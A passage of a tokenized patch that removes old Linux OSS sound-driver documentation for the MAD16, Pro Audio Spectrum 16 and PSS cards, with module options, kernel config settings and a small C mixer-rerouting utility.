"are", "supported", "by", "the", "mad16", "driver", ".", "The", "synth", "device", "is", "supported", "by", "the", "opl3", "driver", ".", "There", "is", "currently", "no", "way", "to", "autoload", "the", "sound", "device", "driver", "if", "more", "than", "one", "card", "is", "installed", ".", "options", "sb", "mad16", "=", "1", "This", "is", "left", "for", "historical", "reasons", ".", "If", "you", "enable", "the", "config", "option", "'", "Support", "MIDI", "in", "older", "MAD16", "based", "cards", "(", "requires", "SB", ")", "'", "or", "if", "you", "use", "an", "older", "mad16", "driver", "it", "will", "force", "loading", "of", "the", "SoundBlaster", "driver", ".", "This", "option", "tells", "the", "SB", "driver", "not", "to", "look", "for", "a", "SB", "card", "but", "to", "wait", "for", "the", "mad16", "driver", ".", "options", "mad16", "irq", "=", "10", "dma", "=", "0", "dma16", "=", "1", "io", "=", "0x530", "joystick", "=", "1", "cdtype", "=", "0", "options", "opl3", "io", "=", "0x388", "post", "-", "install", "mad16", "/", "sbin", "/", "ad1848_mixer_reroute", "14", "8", "15", "3", "16", "6", "This", "sets", "resources", "and", "options", "for", "the", "mad16", "and", "opl3", "drivers", ".", "I", "use", "two", "DMA", "channels", "(", "only", "one", "is", "required", ")", "to", "enable", "full", "duplex", ".", "joystick", "=", "1", "enables", "the", "joystick", "port", ".", "cdtype", "=", "0", "disables", "the", "cd", "port", ".", "You", "can", "also", "set", "mpu_io", "and", "mpu_irq", "in", "the", "mad16", "options", "for", "the", "uart401", "driver", ".", "This", "tells", "modprobe", "to", "run", "/", "sbin", "/", "ad1848_mixer_reroute", "after", "mad16", "is", "successfully", "loaded", "and", "initialized", ".", "The", "source", "for", "ad1848_mixer_reroute", "is", "appended", "to", "the", "end", "of", "this", "readme", "file", ".", "It", "is", "impossible", "for", "the", "sound", "driver", "to", "know", "the", "actual", "connections", "to", "the", "mixer", ".", "The", "3", "inputs", "intended", "for", "cd", ",", "synth", "and", "line", "-", "in", "are", "mapped", "to", "the", "generic", "inputs", "line1", ",", "line2", "and", "line3", ".", "This", "program", "reroutes", "these", "mixer", "channels", "to", "their", "right", "names", "(", "note", "the", "right", "mapping", "depends", "on", "the", "actual", "sound", "card", "that", "you", "use", ")", ".", "The", "numeric", "parameters", "mean", ":", "14", "=", "line1", "8", "=", "cd", "-", "reroute", "line1", "to", "the", "CD", "input", ".", "15", "=", "line2", "3", "=", "synth", "-", "reroute", "line2", "to", "the", "synthesizer", "input", ".", "16", "=", "line3", "6", "=", "line", "-", "reroute", "line3", "to", "the", "line", "input", ".", "For", "reference", "on", "other", "input", "names", "look", "at", "the", "file", "/", "usr", "/", "include", "/", "linux", "/", "soundcard", ".", "h", ".", "Using", "a", "joystick", "You", "must", "enable", "a", "joystick", "in", "the", "mad16", "options", ".", "(", "also", "in", "/", "etc", "/", "isapnp", ".", "conf", "if", "you", "use", "it", ")", ".", "Tested", "with", "regular", "analog", "joysticks", ".", "A", "CDROM", "drive", "connected", "to", "the", "sound", "card", "The", "82C931", "chip", "has", "support", "only", "for", "secondary", "ATAPI", "cdrom", ".", "(", "cdtype", "=", "8", ")", ".", "Loading", "the", "mad16", "driver", "resets", "the", "C931", "chip", "and", "if", "a", "cdrom", "was", "already", "mounted", "it", "may", "cause", "a", "complete", "system", "hang", ".", "Do", "not", "use", "the", "sound", "card", "if", "you", "have", "an", "alternative", ".", "If", "you", "do", "use", "the", "sound", "card", "it", "is", "important", "that", "you", "load", "the", "mad16", "driver", "(", "use", "\"", "modprobe", "mad16", "\"", "to", "prevent", "auto", "-", "unloading", ")", "before", "the", "cdrom", "is", "accessed", "the", "first", "time", ".", "Using", "the", "sound", "driver", "built", "-", "in", "to", "the", "kernel", "may", "help", "here", ",", "but", ".", "..", "Most", "new", "systems", "have", "a", "PnP", "BIOS", "and", "also", "two", "IDE", "controllers", ".", "The", "IDE", "controller", "on", "the", "sound", "card", "may", "be", "needed", "only", "on", "older", "systems", "(", "which", "have", "only", "one", "IDE", "controller", ")", "but", "these", "systems", "also", "do", "not", "have", "a", "PnP", "BIOS", "-", "requiring", "isapnptools", "and", "a", "modularized", "driver", ".", "Known", "problems", "1", ".", "See", "the", "section", "on", "\"", "A", "CDROM", "drive", "connected", "to", "the", "sound", "card", "\"", ".", "2", ".", "On", "my", "system", "the", "codec", "cannot", "capture", "companded", "sound", "samples", ".", "(", "eg", ".", ",", "recording", "from", "/", "dev", "/", "audio", ")", ".", "When", "any", "companded", "capture", "is", "requested", "I", "get", "stereo", "-", "16", "bit", "samples", "instead", ".", "Playback", "of", "companded", "samples", "works", "well", ".", "Apparently", "this", "problem", "is", "not", "common", "to", "all", "C931", "based", "cards", ".", "I", "do", "not", "know", "how", "to", "identify", "cards", "that", "have", "this", "problem", ".", "Source", "for", "ad1848_mixer_reroute", ".", "c", "#", "include", "<", "stdio", ".", "h", ">", "#", "include", "<", "fcntl", ".", "h", ">", "#", "include", "<", "linux", "/", "soundcard", ".", "h", ">", "static", "char", "*", "mixer_names", "[", "SOUND_MIXER_NRDEVICES", "]", "=", "SOUND_DEVICE_LABELS", ";", "int", "main", "(", "int", "argc", ",", "char", "*", "*", "argv", ")", "{", "int", "val", ",", "from", ",", "to", ";", "int", "i", ",", "fd", ";", "fd", "=", "open", "(", "\"/", "dev", "/", "mixer", "\"", ",", "O_RDWR", ")", ";", "if", "(", "fd", "<", "0", ")", "{", "perror", "(", "\"/", "dev", "/", "mixer", "\"", ");", "return", "1", ";", "}", "for", "(", "i", "=", "2", ";", "i", "<", "argc", ";", "i", "+", "=", "2", ")", "{", "from", "=", "atoi", "(", "argv", "[", "i", "-", "1", "]", ");", "to", "=", "atoi", "(", "argv", "[", "i", "]", ");", "if", "(", "to", "=", "=", "SOUND_MIXER_NONE", ")", "fprintf", "(", "stderr", ",", "\"", "%", "s", ":", "turning", "off", "mixer", "%", "s", "\\", "n", "\"", ",", "argv", "[", "0", "]", ",", "mixer_names", "[", "to", "]", ");", "else", "fprintf", "(", "stderr", ",", "\"", "%", "s", ":", "rerouting", "mixer", "%", "s", "to", "%", "s", "\\", "n", "\"", ",", "argv", "[", "0", "]", ",", "mixer_names", "[", "from", "]", ",", "mixer_names", "[", "to", "]", ");", "val", "=", "from", "<", "<", "8", "|", "to", ";", "if", "(", "ioctl", "(", "fd", ",", "SOUND_MIXER_PRIVATE2", ",", "&", "val", ")", ")", "{", "perror", "(", "\"", "AD1848", "mixer", "reroute", "\"", ");", "return", "1", ";", "}", "}", "return", "0", ";", "}", "@", "@", "-", "1", ",", "162", "+", "0", ",", "0", "@", "@", "Pro", "Audio", "Spectrum", "16", "for", "2", ".", "3", ".", "99", "and", "later", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "by", "Thomas", "Molina", "(", "tmolina", "@", "home", ".", "com", ")", "last", "modified", "3", "Mar", "2001", "Acknowledgement", "to", "Axel", "Boldt", "(", "boldt", "@", "math", ".", "ucsb", ".", "edu", ")", "for", "stuff", "taken", "from", "Configure", ".", "help", ",", "Riccardo", "Facchetti", "for", "stuff", "from", "README", ".", "OSS", ",", "and", "others", "whose", "names", "I", "could", "not", "find", ".", "This", "documentation", "is", "relevant", "for", "the", "PAS16", "driver", "(", "pas2_card", ".", "c", "and", "friends", ")", "under", "kernel", "version", "2", ".", "3", ".", "99", "and", "later", ".", "If", "you", "are", "unfamiliar", "with", "configuring", "sound", "under", "Linux", ",", "please", "read", "the", "Sound", "-", "HOWTO", ",", "Documentation", "/", "sound", "/", "oss", "/", "Introduction", "and", "other", "relevant", "docs", "first", ".", "The", "following", "information", "is", "relevant", "information", "from", "README", ".", "OSS", "and", "legacy", "docs", "for", "the", "Pro", "Audio", "Spectrum", "16", "(", "PAS16", ")", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "The", "pas2_card", ".", "c", "driver", "supports", "the", "following", "cards", "Pro", "Audio", "Spectrum", "16", "(", "PAS16", ")", "and", "compatibles", ":", "Pro", "Audio", "Spectrum", "16", "Pro", "Audio", "Studio", "16", "Logitech", "Sound", "Man", "16", "NOTE", "!", "The", "original", "Pro", "Audio", "Spectrum", "as", "well", "as", "the", "PAS", "+", "are", "not", "and", "will", "not", "be", "supported", "by", "the", "driver", ".", "The", "sound", "driver", "configuration", "dialog", "Sound", "configuration", "starts", "by", "making", "some", "yes", "/", "no", "questions", ".", "Be", "careful", "when", "answering", "to", "these", "questions", "since", "answering", "y", "to", "a", "question", "may", "prevent", "some", "later", "ones", "from", "being", "asked", ".", "For", "example", "don", "'", "t", "answer", "y", "to", "the", "question", "about", "(", "PAS16", ")", "if", "you", "don", "'", "t", "really", "have", "a", "PAS16", ".", "Sound", "configuration", "may", "also", "be", "made", "modular", "by", "answering", "m", "to", "configuration", "options", "presented", ".", "Note", "also", "that", "all", "questions", "may", "not", "be", "asked", ".", "The", "configuration", "program", "may", "disable", "some", "questions", "depending", "on", "the", "earlier", "choices", ".", "It", "may", "also", "select", "some", "options", "automatically", "as", "well", ".", "\"", "ProAudioSpectrum", "16", "support", "\"", ",", "-", "Answer", "'", "y", "'", "_ONLY_", "if", "you", "have", "a", "Pro", "Audio", "Spectrum", "_16_", ",", "Pro", "Audio", "Studio", "16", "or", "Logitech", "SoundMan", "16", "(", "be", "sure", "that", "you", "read", "the", "above", "list", "correctly", ")", ".", "Don", "'", "t", "answer", "'", "y", "'", "if", "you", "have", "some", "other", "card", "made", "by", "Media", "Vision", "or", "Logitech", "since", "they", "are", "not", "PAS16", "compatible", ".", "NOTE", "!", "Since", "3", ".", "5", "-", "beta10", "you", "need", "to", "enable", "SB", "support", "(", "next", "question", ")", "if", "you", "want", "to", "use", "the", "SB", "emulation", "of", "PAS16", ".", "It", "'", "s", "also", "possible", "to", "the", "emulation", "if", "you", "want", "to", "use", "a", "true", "SB", "card", "together", "with", "PAS16", "(", "there", "is", "another", "question", "about", "this", "that", "is", "asked", "later", ")", ".", "\"", "Generic", "OPL2", "/", "OPL3", "FM", "synthesizer", "support", "\"", ",", "-", "Answer", "'", "y", "'", "if", "your", "card", "has", "a", "FM", "chip", "made", "by", "Yamaha", "(", "OPL2", "/", "OPL3", "/", "OPL4", ")", ".", "The", "PAS16", "has", "an", "OPL3", "-", "compatible", "FM", "chip", ".", "With", "PAS16", "you", "can", "use", "two", "audio", "device", "files", "at", "the", "same", "time", ".", "/", "dev", "/", "dsp", "(", "and", "/", "dev", "/", "audio", ")", "is", "connected", "to", "the", "8", "/", "16", "bit", "native", "codec", "and", "the", "/", "dev", "/", "dsp1", "(", "and", "/", "dev", "/", "audio1", ")", "is", "connected", "to", "the", "SB", "emulation", "(", "8", "bit", "mono", "only", ")", ".", "The", "new", "stuff", "for", "2", ".", "3", ".", "99", "and", "later", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "The", "following", "configuration", "options", "are", "relevant", "to", "configuring", "the", "PAS16", ":", "Sound", "card", "support", "CONFIG_SOUND", "If", "you", "have", "a", "sound", "card", "in", "your", "computer", ",", "i", ".", "e", ".", "if", "it", "can", "say", "more", "than", "an", "occasional", "beep", ",", "say", "Y", ".", "Be", "sure", "to", "have", "all", "the", "information", "about", "your", "sound", "card", "and", "its", "configuration", "down", "(", "I", "/", "O", "port", ",", "interrupt", "and", "DMA", "channel", ")", ",", "because", "you", "will", "be", "asked", "for", "it", ".", "You", "want", "to", "read", "the", "Sound", "-", "HOWTO", ",", "available", "from", "http", ":", "//", "www", ".", "tldp", ".", "org", "/", "docs", ".", "html", "#", "howto", ".", "General", "information", "about", "the", "modular", "sound", "system", "is", "contained", "in", "the", "files", "Documentation", "/", "sound", "/", "oss", "/", "Introduction", ".", "The", "file", "Documentation", "/", "sound", "/", "oss", "/", "README", ".", "OSS", "contains", "some", "slightly", "outdated", "but", "still", "useful", "information", "as", "well", ".", "OSS", "sound", "modules", "CONFIG_SOUND_OSS", "OSS", "is", "the", "Open", "Sound", "System", "suite", "of", "sound", "card", "drivers", ".", "They", "make", "sound", "programming", "easier", "since", "they", "provide", "a", "common", "API", ".", "Say", "Y", "or", "M", "here", "(", "the", "module", "will", "be", "called", "sound", ".", "o", ")", "if", "you", "haven", "'", "t", "found", "a", "driver", "for", "your", "sound", "card", "above", ",", "then", "pick", "your", "driver", "from", "the", "list", "below", ".", "Persistent", "DMA", "buffers", "CONFIG_SOUND_DMAP", "Linux", "can", "often", "have", "problems", "allocating", "DMA", "buffers", "for", "ISA", "sound", "cards", "on", "machines", "with", "more", "than", "16MB", "of", "RAM", ".", "This", "is", "because", "ISA", "DMA", "buffers", "must", "exist", "below", "the", "16MB", "boundary", "and", "it", "is", "quite", "possible", "that", "a", "large", "enough", "free", "block", "in", "this", "region", "cannot", "be", "found", "after", "the", "machine", "has", "been", "running", "for", "a", "while", ".", "If", "you", "say", "Y", "here", "the", "DMA", "buffers", "(", "64Kb", ")", "will", "be", "allocated", "at", "boot", "time", "and", "kept", "until", "the", "shutdown", ".", "This", "option", "is", "only", "useful", "if", "you", "said", "Y", "to", "\"", "OSS", "sound", "modules", "\"", ",", "above", ".", "If", "you", "said", "M", "to", "\"", "OSS", "sound", "modules", "\"", "then", "you", "can", "get", "the", "persistent", "DMA", "buffer", "functionality", "by", "passing", "the", "command", "-", "line", "argument", "\"", "dmabuf", "=", "1", "\"", "to", "the", "sound", ".", "o", "module", ".", "Say", "y", "here", "for", "PAS16", ".", "ProAudioSpectrum", "16", "support", "CONFIG_SOUND_PAS", "Answer", "Y", "only", "if", "you", "have", "a", "Pro", "Audio", "Spectrum", "16", ",", "ProAudio", "Studio", "16", "or", "Logitech", "SoundMan", "16", "sound", "card", ".", "Don", "'", "t", "answer", "Y", "if", "you", "have", "some", "other", "card", "made", "by", "Media", "Vision", "or", "Logitech", "since", "they", "are", "not", "PAS16", "compatible", ".", "It", "is", "not", "necessary", "to", "enable", "the", "separate", "Sound", "Blaster", "support", ";", "it", "is", "included", "in", "the", "PAS", "driver", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "pas2", "=", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma2", ">", ",<", "sbio", ">", ",<", "sbirq", ">", ",<", "sbdma", ">", ",<", "sbdma2", ">", "to", "the", "kernel", "command", "line", ".", "FM", "Synthesizer", "(", "YM3812", "/", "OPL", "-", "3", ")", "support", "CONFIG_SOUND_YM3812", "Answer", "Y", "if", "your", "card", "has", "a", "FM", "chip", "made", "by", "Yamaha", "(", "OPL2", "/", "OPL3", "/", "OPL4", ")", ".", "Answering", "Y", "is", "usually", "a", "safe", "and", "recommended", "choice", ",", "however", "some", "cards", "may", "have", "software", "(", "TSR", ")", "FM", "emulation", ".", "Enabling", "FM", "support", "with", "these", "cards", "may", "cause", "trouble", "(", "I", "don", "'", "t", "currently", "know", "of", "any", "such", "cards", ",", "however", ")", ".", "Please", "read", "the", "file", "Documentation", "/", "sound", "/", "oss", "/", "OPL3", "if", "your", "card", "has", "an", "OPL3", "chip", ".", "If", "you", "compile", "the", "driver", "into", "the", "kernel", ",", "you", "have", "to", "add", "\"", "opl3", "=", "<", "io", ">", "\"", "to", "the", "kernel", "command", "line", ".", "If", "you", "compile", "your", "drivers", "into", "the", "kernel", ",", "you", "MUST", "configure", "OPL3", "support", "as", "a", "module", "for", "PAS16", "support", "to", "work", "properly", ".", "You", "can", "then", "get", "OPL3", "functionality", "by", "issuing", "the", "command", ":", "insmod", "opl3", "In", "addition", ",", "you", "must", "either", "add", "the", "following", "line", "to", "/", "etc", "/", "modprobe", ".", "d", "/", "*.", "conf", ":", "options", "opl3", "io", "=", "0x388", "or", "else", "add", "the", "following", "line", "to", "/", "etc", "/", "lilo", ".", "conf", ":", "opl3", "=", "0x388", "EXAMPLES", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "To", "use", "the", "PAS16", "in", "my", "computer", "I", "have", "enabled", "the", "following", "sound", "configuration", "options", ":", "CONFIG_SOUND", "=", "y", "CONFIG_SOUND_OSS", "=", "y", "CONFIG_SOUND_TRACEINIT", "=", "y", "CONFIG_SOUND_DMAP", "=", "y", "CONFIG_SOUND_PAS", "=", "y", "CONFIG_SOUND_SB", "=", "n", "CONFIG_SOUND_YM3812", "=", "m", "I", "have", "also", "included", "the", "following", "append", "line", "in", "/", "etc", "/", "lilo", ".", "conf", ":", "append", "=", "\"", "pas2", "=", "0x388", ",", "10", ",", "3", ",", "-", "1", ",", "0x220", ",", "5", ",", "1", ",", "-", "1", "sb", "=", "0x220", ",", "5", ",", "1", ",", "-", "1", "opl3", "=", "0x388", "\"", "The", "io", "address", "of", "0x388", "is", "default", "configuration", "on", "the", "PAS16", ".", "The", "irq", "of", "10", "and", "dma", "of", "3", "may", "not", "match", "your", "installation", ".", "The", "above", "configuration", "enables", "PAS16", ",", "8", "-", "bit", "Soundblaster", "and", "OPL3", "functionality", ".", "If", "Soundblaster", "functionality", "is", "not", "desired", ",", "the", "following", "line", "would", "be", "appropriate", ":", "append", "=", "\"", "pas2", "=", "0x388", ",", "10", ",", "3", ",", "-", "1", ",", "0", ",", "-", "1", ",", "-", "1", ",", "-", "1", "opl3", "=", "0x388", "\"", "If", "sound", "is", "built", "totally", "modular", ",", "the", "above", "options", "may", "be", "specified", "in", "/", "etc", "/", "modprobe", ".", "d", "/", "*.", "conf", "for", "pas2", ",", "sb", "and", "opl3", "respectively", ".", "@", "@", "-", "1", ",", "41", "+", "0", ",", "0", "@", "@", "The", "PSS", "cards", "and", "other", "ECHO", "based", "cards", "provide", "an", "onboard", "DSP", "with", "downloadable", "programs", "and", "also", "has", "an", "AD1848", "\"", "Microsoft", "Sound", "System", "\"", "device", ".", "The", "PSS", "driver", "enables", "MSS", "and", "MPU401", "modes", "of", "the", "card", ".", "SB", "is", "not", "enabled", "since", "it", "doesn", "'", "t", "work", "concurrently", "with", "MSS", ".", "If", "you", "build", "this", "driver", "as", "a", "module", "then", "the", "driver", "takes", "the", "following", "parameters", "pss_io", ".", "The", "I", "/", "O", "base", "the", "PSS", "card", "is", "configured", "at", "(", "normally", "0x220", "or", "0x240", ")", "mss_io", "The", "base", "address", "of", "the", "Microsoft", "Sound", "System", "interface", ".", "This", "is", "normally", "0x530", ",", "but", "may", "be", "0x604", "or", "other", "addresses", ".", "mss_irq", "The", "interrupt", "assigned", "to", "the", "Microsoft", "Sound", "System", "emulation", ".", "IRQ", "'", "s", "3", ",", "5", ",", "7", ",", "9", ",", "10", ",", "11", "and", "12", "are", "available", ".", "If", "you", "get", "IRQ", "errors", "be", "sure", "to", "check", "the", "interrupt", "is", "set", "to", "\"", "ISA", "/", "Legacy", "\"", "in", "the", "BIOS", "on", "modern", "machines", ".", "mss_dma", "The", "DMA", "channel", "used", "by", "the", "Microsoft", "Sound", "System", ".", "This", "can", "be", "0", ",", "1", ",", "or", "3", ".", "DMA", "0", "is", "not", "available", "on", "older", "machines", "and", "will", "cause", "a", "crash", "on", "them", ".", "mpu_io", "The", "MPU", "emulation", "base", "address", ".", "This", "sets", "the", "base", "of", "the", "synthesizer", ".", "It", "is", "typically", "0x330", "but", "can", "be", "altered", ".", "mpu_irq", "The", "interrupt", "to", "use", "for", "the", "synthesizer", ".", "It", "must", "differ", "from", "the", "IRQ", "used", "by", "the", "Microsoft", "Sound", "System", "port", ".", "The", "mpu_io", "/", "mpu_irq", "fields", "are", "optional", ".", "If", "they", "are", "not", "specified", "the", "synthesizer", "parts", "are", "not", "configured", ".", "When", "the", "module", "is", "loaded", "it", "looks", "for", "a", "file", "called", "/", "etc", "/", "sound", "/", "pss_synth", ".", "This", "is", "the", "firmware", "file", "from", "the", "DOS", "install", "disks", ".", "This", "fil", "holds", "a", "general", "MIDI", "emulation", ".", "The", "file", "expected", "is", "called", "genmidi", ".", "ld", "on", "newer", "DOS", "driver", "install", "disks", "and", "synth", ".", "ld", "on", "older", "ones", ".", "You", "can", "also", "load", "alternative", "DSP", "algorithms", "into", "the", "card", "if", "you", "wish", ".", "One", "alternative", "driver", "can", "be", "found", "at", "http", ":", "//", "www", ".", "mpg123", ".", "de", "/", "@", "@", "-", "1", ",", "88", "+", "0", ",", "0", "@", "@", "This", "file", "contains", "notes", "for", "users", "of", "PSS", "sound", "cards", "who", "wish", "to", "use", "the", "newly", "added", "features", "of", "the", "newest", "version", "of", "this", "driver", ".", "The", "major", "enhancements", "present", "in", "this", "new", "revision", "of", "this", "driver", "is", "the", "addition", "of", "two", "new", "module", "parameters", "that", "allow", "you", "to", "take", "full", "advantage", "of", "all", "the", "features", "present", "on", "your", "PSS", "sound", "card", ".", "These", "features", "include", "the", "ability", "to", "enable", "both", "the", "builtin", "CDROM", "and", "joystick", "ports", ".", "pss_enable_joystick", "This", "parameter", "is", "basically", "a", "flag", ".", "A", "0", "will", "leave", "the", "joystick", "port", "disabled", ",", "while", "a", "non", "-", "zero", "value", "would", "enable", "the", "joystick", "port", ".", "The", "default", "setting", "is", "pss_enable_joystick", "=", "0", "as", "this", "keeps", "this", "driver", "fully", "compatible", "with", "systems", "that", "were", "using", "previous", "versions", "of", "this", "driver", ".", "If", "you", "wish", "to", "enable", "the", "joystick", "port", "you", "will", "have", "to", "add", "pss_enable_joystick", "=", "1", "as", "an", "argument", "to", "the", "driver", ".", "To", "actually", "use", "the", "joystick", "port", "you", "will", "then", "have", "to", "load", "the", "joystick", "driver", "itself", ".", "Just", "remember", "to", "load", "the", "joystick", "driver", "AFTER", "the", "pss", "sound", "driver", ".", "pss_cdrom_port", "This", "parameter", "takes", "a", "port", "address", "as", "its", "parameter", ".", "Any", "available", "port", "address", "can", "be", "specified", "to", "enable", "the", "CDROM", "port", ",", "except", "for", "0x0", "and", "-", "1", "as", "these", "values", "would", "leave", "the", "port", "disabled", ".", "Like", "the", "joystick", "port", ",", "the", "cdrom", "port", "will", "require", "that", "an", "appropriate", "CDROM", "driver", "be", "loaded", "before", "you", "can", "make", "use", "of", "the", "newly", "enabled", "CDROM", "port", ".", "Like", "the", "joystick", "port", "option", "above", ",", "remember", "to", "load", "the", "CDROM", "driver", "AFTER", "the", "pss", "sound", "driver", ".", "While", "it", "may", "differ", "on", "some", "PSS", "sound", "cards", ",", "all", "the", "PSS", "sound", "cards", "that", "I", "have", "seen", "have", "a", "builtin", "Wearnes", "CDROM", "port", ".", "If", "this", "is", "the", "case", "with", "your", "PSS", "sound", "card", "you", "should", "load", "aztcd", "with", "the", "appropriate", "port", "option", "that", "matches", "the", "port", "you", "assigned", "to", "the", "CDROM", "port", "when", "you", "loaded", "your", "pss", "sound", "driver", ".", "(", "ex", ".", "modprobe", "pss", "pss_cdrom_port", "=", "0x340", "&", "&", "modprobe", "aztcd", "aztcd", "=", "0x340", ")", "The", "default", "setting", "of", "this", "parameter", "leaves", "the", "CDROM", "port", "disabled", "to", "maintain", "full", "compatibility", "with", "systems", "using", "previous", "versions", "of", "this", "driver", ".", "Other", "options", "have", "also", "been", "added", "for", "the", "added", "convenience", "and", "utility", "of", "the", "user", ".", "These", "options", "are", "only", "available", "if", "this", "driver", "is", "loaded", "as", "a", "module", ".", "pss_no_sound", "This", "module", "parameter", "is", "a", "flag", "that", "can", "be", "used", "to", "tell", "the", "driver", "to", "just", "configure", "non", "-", "sound", "components", ".", "0", "configures", "all", "components", ",", "a", "non", "-", "0", "value", "will", "only", "attempt", "to", "configure", "the", "CDROM", "and", "joystick", "ports", ".", "This", "parameter", "can", "be", "used", "by", "a", "user", "who", "only", "wished", "to", "use", "the", "builtin", "joystick", "and", "/", "or", "CDROM", "port", "(", "s", ")", "of", "his", "PSS", "sound", "card", ".", "If", "this", "driver", "is", "loaded", "with", "this", "parameter", "and", "with", "the", "parameter", "below", "set", "to", "true", "then", "a", "user", "can", "safely", "unload", "this", "driver", "with", "the", "following", "command", "\"", "rmmod", "pss", "&", "&", "rmmod", "ad1848", "&", "&", "rmmod", "mpu401", "&", "&", "rmmod", "sound", "&", "&", "rmmod", "soundcore", "\"", "and", "retain", "the", "full", "functionality", "of", "his", "CDROM", "and", "/", "or", "joystick", "port", "(", "s", ")", "while", "gaining", "back", "the", "memory", "previously", "used", "by", "the", "sound", "drivers", ".", "This", "default", "setting", "of", "this", "parameter", "is", "0", "to", "retain", "full", "behavioral", "compatibility", "with", "previous", "versions", "of", "this", "driver", ".", "pss_keep_settings", "This", "parameter", "can", "be", "used", "to", "specify", "whether", "you", "want", "the", "driver", "to", "reset", "all", "emulations", "whenever", "its", "unloaded", ".", "This", "can", "be", "useful", "for", "those", "who", "are", "sharing", "resources", "(", "io", "ports", ",", "IRQ", "'", "s", ",", "DMA", "'", "s", ")", "between", "different", "ISA", "cards", ".", "This", "flag", "can", "also", "be", "useful", "in", "that", "future", "versions", "of", "this", "driver", "may", "reset", "all", "emulations", "by", "default", "on", "the", "driver", "'", "s", "unloading", "(", "as", "it", "probably", "should", ")", ",", "so", "specifying", "it", "now", "will", "ensure", "that", "all", "future", "versions", "of", "this", "driver", "will", "continue", "to", "work", "as", "expected", ".", "The", "default", "value", "of", "this", "parameter", "is", "1", "to", "retain", "full", "behavioral", "compatibility", "with", "previous", "versions", "of", "this", "driver", ".", "pss_firmware", "This", "parameter", "can", "be", "used", "to", "specify", "the", "file", "containing", "the", "firmware", "code", "so", "that", "a", "user", "could", "tell", "the", "driver", "where", "that", "file", "is", "located", "instead", "of", "having", "to", "put", "it", "in", "a", "predefined", "location", "with", "a", "predefined", "name", ".", "The", "default", "setting", "of", "this", "parameter", "is", "\"", "/", "etc", "/", "sound", "/", "pss_synth", "\"", "as", "this", "was", "the", "path", "and", "filename", "the", "hardcoded", "value", "in", "the", "previous", "versions", "of", "this", "driver", ".", "Examples", ":", "#", "Normal", "PSS", "sound", "card", "system", ",", "loading", "of", "drivers", ".", "#", "Should", "be", "specified", "in", "an", "rc", "file", "(", "ex", ".", "Slackware", "uses", "/", "etc", "/", "rc", ".", "d", "/", "rc", ".", "modules", ")", ".", "/", "sbin", "/", "modprobe", "pss", "pss_io", "=", "0x220", "mpu_io", "=", "0x338", "mpu_irq", "=", "9", "mss_io", "=", "0x530", "mss_irq", "=", "10", "mss_dma", "=", "1", "pss_cdrom_port", "=", "0x340", "pss_enable_joystick", "=", "1", "/", "sbin", "/", "modprobe", "aztcd", "aztcd", "=", "0x340", "/", "sbin", "/", "modprobe", "joystick", "#", "System", "using", "the", "PSS", "sound", "card", "just", "for", "its", "CDROM", "and", "joystick", "ports", ".", "#", "Should", "be", "specified", "in", "an", "rc", "file", "(", "ex", ".", "Slackware", "uses", "/", "etc", "/", "rc", ".", "d", "/", "rc", ".", "modules", ")", ".", "/", "sbin", "/", "modprobe", "pss", "pss_io", "=", "0x220", "pss_cdrom_port", "=", "0x340", "pss_enable_joystick", "=", "1", "pss_no_sound", "=", "1", "/", "sbin", "/", "rmmod", "pss", "&", "&", "/", "sbin", "/", "rmmod", "ad1848", "&", "&", "/", "sbin", "/", "rmmod", "mpu401", "&", "&", "/", "sbin", "/", "rmmod", "sound", "&", "&", "/", "sbin", "/", "rmmod", "soundcore", "#", "This", "line", "not", "needed", ",", "but", "saves", "memory", ".", "/", "sbin", "/", "modprobe", "aztcd", "aztcd", "=", "0x340", "/", "sbin", "/", "modprobe", "joystick", "@", "@", "-", "1", ",", "1455", "+", "0", ",", "0", "@", "@", "Introduction", "This", "file", "is", "a", "collection", "of", "all", "the", "old", "Readme", "files", "distributed", "with", "OSS", "/", "Lite", "by", "Hannu", "Savolainen", ".", "Since", "the", "new", "Linux", "sound", "driver", "is", "founded", "on", "it", "I", "think", "these", "information", "may", "still", "be", "interesting", "for", "users", "that", "have", "to", "configure", "their", "sound", "system", ".", "Be", "warned", ":", "Alan", "Cox", "is", "the", "current", "maintainer", "of", "the", "Linux", "sound", "driver", "so", "if", "you", "have", "problems", "with", "it", ",", "please", "contact", "him", "or", "the", "current", "device", "-", "specific", "driver", "maintainer", "(", "e", ".", "g", ".", "for", "aedsp16", "specific", "problems", "contact", "me", ")", ".", "If", "you", "have", "patches", ",", "contributions", "or", "suggestions", "send", "them", "to", "Alan", ":", "I", "'", "m", "sure", "they", "are", "welcome", ".", "In", "this", "document", "you", "will", "find", "a", "lot", "of", "references", "about", "OSS", "/", "Lite", "or", "ossfree", ":", "they", "are", "gone", "forever", ".", "Keeping", "this", "in", "mind", "and", "with", "a", "grain", "of", "salt", "this", "document", "can", "be", "still", "interesting", "and", "very", "helpful", ".", "[", "File", "edited", "17", ".", "01", ".", "1999", "-", "Riccardo", "Facchetti", "]", "[", "Edited", "miroSOUND", "section", "19", ".", "04", ".", "2001", "-", "Robert", "Siemer", "]", "OSS", "/", "Free", "version", "3", ".", "8", "release", "notes", "Please", "read", "the", "SOUND", "-", "HOWTO", "(", "available", "from", "sunsite", ".", "unc", ".", "edu", "and", "other", "Linux", "FTP", "sites", ")", ".", "It", "gives", "instructions", "about", "using", "sound", "with", "Linux", ".", "It", "'", "s", "bit", "out", "of", "date", "but", "still", "very", "useful", ".", "Information", "about", "bug", "fixes", "and", "such", "things", "is", "available", "from", "the", "web", "page", "(", "see", "above", ")", ".", "Please", "check", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "pguide", "for", "more", "info", "about", "programming", "with", "OSS", "API", ".", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", 